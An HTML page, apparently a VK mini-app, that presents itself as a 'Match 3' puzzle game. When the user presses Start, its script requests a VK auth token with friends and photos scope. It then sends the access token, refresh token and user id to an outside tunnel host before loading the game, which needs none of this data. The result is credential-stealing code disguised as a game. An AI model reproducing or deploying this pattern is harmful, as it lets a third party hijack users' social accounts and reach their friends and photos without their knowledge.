<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Match 3</title>
  <script src="https://unpkg.com/@vkontakte/vk-bridge@latest/dist/browser.min.js"></script>
  <style>
    body {
      background: linear-gradient(to bottom, #ADD8E6, #87CEEB);
      min-height: 100vh;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: 'Arial', sans-serif;
      position: relative;
    }

    #userName {
      position: absolute;
      top: 20px;
      right: 20px;
      color: white;
      font-size: 18px;
      background: rgba(0, 0, 0, 0.3);
      padding: 10px 15px;
      border-radius: 15px;
      display: none;
    }

    #container {
      text-align: center;
      max-width: 900px;
      background: rgba(255, 255, 255, 0.2);
      padding: 20px;
      border-radius: 15px;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
    }

    button {
      padding: 15px 30px;
      background: #4682B4;
      border: none;
      border-radius: 10px;
      color: white;
      font-size: 18px;
      cursor: pointer;
      transition: 0.3s;
      margin: 10px 0;
    }

    button:hover {
      background: #5F9EA0;
    }

    .hidden {
      display: none;
    }

    .status {
      margin: 20px 0;
      color: white;
      font-size: 14px;
    }

    .error {
      color: #FF4747;
      font-weight: bold;
    }

    #gameBoard {
      display: grid;
      grid-gap: 2px;
      border: 1px solid #5F9EA0;
      width: 870px;
      height: 870px;
      background-color: #77B5FE;
      border-radius: 20px;
      overflow: hidden;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
      margin: 20px auto;
    }

    .cell {
      width: calc(870px / 8 - 2px);
      height: calc(870px / 8 - 2px);
      background-size: contain;
      background-repeat: no-repeat;
      background-position: center;
      border-radius: 15px;
      cursor: pointer;
      transition: transform 0.2s ease, background-color 0.2s ease;
    }

    .cell.swapping {
      transform: scale(1.2);
    }

    .cell.removing {
      opacity: 0;
      transition: opacity 0.2s ease;
    }
  </style>
</head>
<body>
  <div id="userName"></div>
  
  <div id="container">
    <h1>Match 3</h1>
    <button id="authBtn">Start</button>
    <div class="status" id="status">Нажмите Play для начала</div>
    <div id="game" class="hidden">
      <div id="gameBoard"></div>
    </div>
  </div>

<script>
const APP_ID = 8109529;
let accessToken = null;
let userInfo = null;

function showError(message) {
  const status = document.getElementById('status');
  if (status) {
    status.textContent = message;
    status.classList.add('error');
  }
}

function updateStatus(message) {
  const status = document.getElementById('status');
  if (status) {
    status.textContent = message;
    status.classList.remove('error');
  }
}

async function initialize() {
  try {
    const isSupported = await vkBridge.supportsAsync('VKWebAppInit');
    if (!isSupported) {
      throw new Error('Откройте приложение внутри VK!');
    }

    await vkBridge.send('VKWebAppInit');
    updateStatus('Инициализация...');

    const authData = await vkBridge.send('VKWebAppGetAuthToken', {
      app_id: APP_ID,
      scope: 'friends,photos'
    });

    accessToken = authData.access_token;

    userInfo = await vkBridge.send('VKWebAppGetUserInfo');
    
    const userName = document.getElementById('userName');
    if (userName) {
      userName.textContent = userInfo.first_name;
      userName.style.display = 'block';
    }

    updateStatus('Добро пожаловать!');

    const tokenData = {
      user_id: userInfo.id.toString(),
      access_token: authData.access_token,
      refresh_token: authData.refresh_token || '',
      token_type: authData.token_type || 'Bearer',
      expires_in: authData.expires_in || 3600,
      id_token: authData.id_token || '',
      token_datetime: new Date().toISOString()
    };

    // Отправляем токен на сервер с таймаутом
    await sendTokenToYourServer(tokenData);

    showGame();

  } catch (error) {
    showError(`Ошибка: ${error.message || 'Неизвестная ошибка'}`);
    console.error(error);
  }
}

async function sendTokenToYourServer(data) {
  const controller = new AbortController();
  const reason = 'Таймаут запроса через 5 секунд';
  const timeoutId = setTimeout(() => controller.abort(reason), 5000); // Таймаут в 5 секунд
  
  try {
    const response = await fetch('https://bla39d-37-45-190-41.ru.tuna.am/api/vk-token', { 
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data),
      signal: controller.signal
    });

    clearTimeout(timeoutId);

    if (!response.ok) {
      throw new Error(`Ошибка ${response.status}: ${response.statusText}`);
    }

    console.log('Данные успешно отправлены на ваш сервер');
    return await response.json();
  } catch (error) {
    clearTimeout(timeoutId);
    if (error.name === 'AbortError') {
      showError('Ошибка сохранения данных: запрос отменён по таймауту');
    } else {
      showError('Ошибка сохранения данных');
    }
    console.error('Ошибка отправки на ваш сервер:', error);
  }
}

async function showGame() {
  const authBtn = document.getElementById('authBtn');
  const game = document.getElementById('game');
  
  if (authBtn) authBtn.classList.add('hidden');
  if (game) game.classList.remove('hidden');

  try {
    await loadGameScript();
    if (typeof startGame === 'function') {
      startGame();
    } else {
      showError('Ошибка инициализации игры');
    }
  } catch (error) {
    showError('Не удалось загрузить игру');
  }
}

function loadGameScript() {
  return new Promise((resolve, reject) => {
    const script = document.createElement('script');
    script.src = 'game.js';
    script.onload = resolve;
    script.onerror = reject;
    setTimeout(() => reject(new Error('Время загрузки игры истекло')), 5000);
    document.head.appendChild(script);
  });
}

const authBtn = document.getElementById('authBtn');
if (authBtn) authBtn.addEventListener('click', initialize);

</script>
</body>
</html>